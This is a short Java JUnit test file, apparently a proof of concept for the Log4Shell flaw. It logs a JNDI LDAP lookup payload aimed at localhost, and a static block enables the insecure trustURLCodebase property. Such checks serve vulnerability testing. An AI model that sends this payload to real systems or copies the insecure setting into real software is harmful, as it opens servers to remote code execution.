package cn.typesafe.km;

import lombok.extern.slf4j.Slf4j;
import org.junit.jupiter.api.Test;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

@Slf4j
public class LogTest {

    String poc = "${jndi:ldap://127.0.0.1:80/Object}";

    private static final Logger logger = LoggerFactory.getLogger(LogTest.class);

    static {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
    }

    @Test
    public void test0() {
        log.error(poc);
    }

    @Test
    public void test1() {
        logger.error(poc);
    }
}
